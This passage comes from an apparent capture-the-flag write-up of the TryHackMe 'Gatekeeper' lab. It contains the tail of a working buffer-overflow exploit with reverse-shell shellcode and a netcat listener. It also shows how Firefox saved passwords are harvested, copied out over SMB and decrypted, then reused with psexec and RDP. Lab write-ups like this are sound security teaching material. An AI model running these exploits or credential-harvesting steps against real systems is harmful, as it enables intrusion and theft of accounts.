shellcode += b"\x2f\xaf\xd7\x85\xa4\xdd\xff\xaa\x0d\x6b\x26"
shellcode += b"\x85\x8e\xc0\x1a\x84\x0c\x1b\x4f\x66\x2c\xd4"
shellcode += b"\x82\x67\x69\x09\x6e\x35\x22\x45\xdd\xa9\x47"
shellcode += b"\x13\xde\x42\x1b\xb5\x66\xb7\xec\xb4\x47\x66"
shellcode += b"\x66\xef\x47\x89\xab\x9b\xc1\x91\xa8\xa6\x98"
shellcode += b"\x2a\x1a\x5c\x1b\xfa\x52\x9d\xb0\xc3\x5a\x6c"
shellcode += b"\xc8\x04\x5c\x8f\xbf\x7c\x9e\x32\xb8\xbb\xdc"
shellcode += b"\xe8\x4d\x5f\x46\x7a\xf5\xbb\x76\xaf\x60\x48"
shellcode += b"\x74\x04\xe6\x16\x99\x9b\x2b\x2d\xa5\x10\xca"
shellcode += b"\xe1\x2f\x62\xe9\x25\x6b\x30\x90\x7c\xd1\x97"
shellcode += b"\xad\x9e\xba\x48\x08\xd5\x57\x9c\x21\xb4\x3f"
shellcode += b"\x51\x08\x46\xc0\xfd\x1b\x35\xf2\xa2\xb7\xd1"
shellcode += b"\xbe\x2b\x1e\x26\xc0\x01\xe6\xb8\x3f\xaa\x17"
shellcode += b"\x91\xfb\xfe\x47\x89\x2a\x7f\x0c\x49\xd2\xaa"
shellcode += b"\x83\x19\x7c\x05\x64\xc9\x3c\xf5\x0c\x03\xb3"
shellcode += b"\x2a\x2c\x2c\x19\x43\xc7\xd7\xca\x66\x10\xcc"
shellcode += b"\xf3\x1f\x22\xf2\x02\x5b\xab\x14\x6e\x8b\xfa"
shellcode += b"\x8f\x07\x32\xa7\x5b\xb9\xbb\x7d\x26\xf9\x30"
shellcode += b"\x72\xd7\xb4\xb0\xff\xcb\x21\x31\x4a\xb1\xe4"
shellcode += b"\x4e\x60\xdd\x6b\xdc\xef\x1d\xe5\xfd\xa7\x4a"
shellcode += b"\xa2\x30\xbe\x1e\x5e\x6a\x68\x3c\xa3\xea\x53"
shellcode += b"\x84\x78\xcf\x5a\x05\x0c\x6b\x79\x15\xc8\x74"
shellcode += b"\xc5\x41\x84\x22\x93\x3f\x62\x9d\x55\xe9\x3c"
shellcode += b"\x72\x3c\x7d\xb8\xb8\xff\xfb\xc5\x94\x89\xe3"
shellcode += b"\x74\x41\xcc\x1c\xb8\x05\xd8\x65\xa4\xb5\x27"
shellcode += b"\xbc\x6c\xd5\xc5\x14\x99\x7e\x50\xfd\x20\xe3"
shellcode += b"\x63\x28\x66\x1a\xe0\xd8\x17\xd9\xf8\xa9\x12"
shellcode += b"\xa5\xbe\x42\x6f\xb6\x2a\x64\xdc\xb7\x7e"

buffer = payload + nop + shellcode

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((ip, port))

		print('[+] Sending evil buffer...')
		s.send(buffer + b'\r\n') # \r means the Enter key, \n means new line character
		print('[+] Done!')
except:
	print('[-] Unable to send/connect to the target.')
```

**Setup a `nc` listener:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# nc -lnvp 443
listening on [any] 443 ...
```

**Run the exploit:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python3 exploit.py
[+] Sending evil buffer...
[+] Done!
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.8.27.249] from (UNKNOWN) [10.10.192.183] 49173
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami && ipconfig
gatekeeper\natbat

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::68c6:44a8:9d3a:1bb9%17
   IPv4 Address. . . . . . . . . . . : 10.10.192.183
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal

C:\Users\natbat\Desktop>
```

I'm user `natbat`!

**user.txt:**
```
C:\Users\natbat\Desktop>type C:\Users\natbat\Desktop\user.txt.txt
{Redacted}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
```

## Privilege Escalation

### natbat to mayor

**Find the CPU architecture:**
```
C:\Users\natbat\Desktop>systeminfo 

Host Name:                 GATEKEEPER
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
[...]
System Type:               x64-based PC
```

**It's 64-bit.**

**Find local users:**
```
C:\Users\natbat\Desktop>net user

User accounts for \\GATEKEEPER

-------------------------------------------------------------------------------
Administrator            Guest                    mayor                    
natbat          
```

- Found user: mayor and natbat

```
C:\Users\natbat\Desktop>net user mayor
[...]
Local Group Memberships      *Administrators       *HomeUsers            
                             *Users                
[...]

C:\Users\natbat\Desktop>net user natbat
[...]
Local Group Memberships      *HomeUsers            *Users                
[...]
```

**He's inside the administrators group!**

**In `natbat` Desktop directory, there is a `Firefox.lnk` shortcut file! Which means the target machine has FireFox installed!**
```
C:\Users\natbat\Desktop>dir
[...]
04/21/2020  05:00 PM             1,197 Firefox.lnk
[...]
```

**According to a [FireFox official post](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data#firefox:win7:fx102), we can find all the profiles in `%APPDATA%\Mozilla\Firefox\Profiles\`!**
```
C:\Users\natbat\Desktop>dir %APPDATA%\Mozilla\Firefox\Profiles\
[...]
05/14/2020  10:45 PM    <DIR>          ljfn812a.default-release
04/21/2020  05:00 PM    <DIR>          rajfzh3y.default
```

There are **2 profiles**!

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir rajfzh3y.default
[...]
04/21/2020  05:00 PM                47 times.json
```

Nothing weird in `rajfzh3y.default` profile.

**How about the `ljfn812a.default-release` profile?**
```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir ljfn812a.default-release
[...]
05/14/2020  10:30 PM                24 addons.json
05/14/2020  10:23 PM             1,952 addonStartup.json.lz4
05/14/2020  10:45 PM                 0 AlternateServices.txt
05/14/2020  10:30 PM    <DIR>          bookmarkbackups
05/14/2020  10:24 PM               216 broadcast-listeners.json
04/22/2020  12:47 AM           229,376 cert9.db
04/21/2020  05:00 PM               220 compatibility.ini
04/21/2020  05:00 PM               939 containers.json
04/21/2020  05:00 PM           229,376 content-prefs.sqlite
05/14/2020  10:45 PM           524,288 cookies.sqlite
05/14/2020  10:24 PM    <DIR>          crashes
05/14/2020  10:45 PM    <DIR>          datareporting
04/21/2020  05:00 PM             1,111 extension-preferences.json
04/21/2020  05:00 PM    <DIR>          extensions
05/14/2020  10:34 PM            39,565 extensions.json
05/14/2020  10:45 PM         5,242,880 favicons.sqlite
05/14/2020  10:39 PM           196,608 formhistory.sqlite
04/21/2020  10:50 PM    <DIR>          gmp-gmpopenh264
04/21/2020  10:50 PM    <DIR>          gmp-widevinecdm
04/21/2020  05:00 PM               540 handlers.json
04/21/2020  05:02 PM           294,912 key4.db
05/14/2020  10:43 PM               600 logins.json
04/21/2020  05:00 PM    <DIR>          minidumps
05/14/2020  10:23 PM                 0 parent.lock
05/14/2020  10:25 PM            98,304 permissions.sqlite
04/21/2020  05:00 PM               506 pkcs11.txt
05/14/2020  10:45 PM         5,242,880 places.sqlite
05/14/2020  10:45 PM            11,096 prefs.js
05/14/2020  10:45 PM            65,536 protections.sqlite
05/14/2020  10:45 PM    <DIR>          saved-telemetry-pings
05/14/2020  10:23 PM             2,715 search.json.mozlz4
05/14/2020  10:45 PM                 0 SecurityPreloadState.txt
04/21/2020  10:50 PM    <DIR>          security_state
05/14/2020  10:45 PM               288 sessionCheckpoints.json
05/14/2020  10:45 PM    <DIR>          sessionstore-backups
05/14/2020  10:45 PM            12,889 sessionstore.jsonlz4
04/21/2020  05:00 PM                18 shield-preference-experiments.json
05/14/2020  10:45 PM             1,357 SiteSecurityServiceState.txt
04/21/2020  05:00 PM    <DIR>          storage
05/14/2020  10:45 PM             4,096 storage.sqlite
04/21/2020  05:00 PM                50 times.json
05/14/2020  10:45 PM                 0 TRRBlacklist.txt
04/21/2020  05:00 PM    <DIR>          weave
04/21/2020  05:02 PM            98,304 webappsstore.sqlite
05/14/2020  10:45 PM               140 xulstore.json
```

Also, according to their post, all passwords are stored in:

- key4.db
- logins.json

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>type logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

**Let's decrypt that encrypted password via [firefox_decrypt](https://github.com/unode/firefox_decrypt)!**

- Clone that repository:

```
┌──(root🌸siunam)-[/opt]
└─# git clone https://github.com/unode/firefox_decrypt.git
```

- Transfer the profile via SMB share:

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
Users        C:\Users
```

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>xcopy ljfn812a.default-release C:\Users\Share

┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# mkdir ljfn812a.default-release;cd ljfn812a.default-release

┌──(root🌸siunam)-[~/…/thm/ctf/Gatekeeper/ljfn812a.default-release]
└─# smbclient \\\\$RHOSTS\\Users
Password for [WORKGROUP\nam]:
Try "help" to get a list of possible commands.
smb: \> cd Share
smb: \Share\> prompt
smb: \Share\> timeout 60
io_timeout per operation is now 60
smb: \Share\> mget *
```

- Decrypt the password file:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# python /opt/firefox_decrypt/firefox_decrypt.py ljfn812a.default-release 
2022-10-16 06:36:57,011 - WARNING - profile.ini not found in ljfn812a.default-release
2022-10-16 06:36:57,012 - WARNING - Continuing and assuming 'ljfn812a.default-release' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '{Redacted}'
```

**Found `mayor` password!**

**Since the target machine has SMB opened, let's use that credentials to login in SMB `Users` share!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# smbclient \\\\$RHOSTS\\Users -U mayor%{Redacted}
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  All Users                       DHSrn        0  Tue Jul 14 01:08:56 2009
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  Default User                    DHSrn        0  Tue Jul 14 01:08:56 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  mayor                               D        0  Sun Apr 19 11:55:52 2020
  natbat                              D        0  Thu May 14 21:58:04 2020
  Public                             DR        0  Thu May 14 21:54:46 2020
  Share                             DAn        0  Sun Oct 16 06:26:13 2022

smb: \> cd mayor\Desktop

smb: \mayor\Desktop\> dir
  .                                  DR        0  Thu May 14 21:58:07 2020
  ..                                 DR        0  Thu May 14 21:58:07 2020
  desktop.ini                       AHS      282  Sun Apr 19 11:55:56 2020
  root.txt.txt                        A       27  Thu May 14 21:21:09 2020
```

**Found the flag! Let's `get` it!**
```
smb: \mayor\Desktop\> get root.txt.txt
```

> Note: If you want to login as `mayor` in the target machine, you can:

**`impacket-psexec`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# impacket-psexec mayor:{Redacted}@$RHOSTS
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.192.183.....
[*] Found writable share ADMIN$
[*] Uploading file aemFtVZQ.exe
[*] Opening SVCManager on 10.10.192.183.....
[*] Creating service VyAI on 10.10.192.183.....
[*] Starting service VyAI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami && ipconfig    
nt authority\system

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::68c6:44a8:9d3a:1bb9%17
   IPv4 Address. . . . . . . . . . . : 10.10.192.183
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```

**RDP:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# xfreerdp /u:mayor /p:{Redacted} /cert:ignore /v:$RHOSTS
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gatekeeper/images/a19.png)

## Rooted

**root.txt:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Gatekeeper]
└─# cat root.txt.txt                  
{Redacted}
```

# Conclusion

What we've learned:

1. SMB Enumeration
2. Stack Buffer Overflow
3. FireFox Profile Credentials Harvesting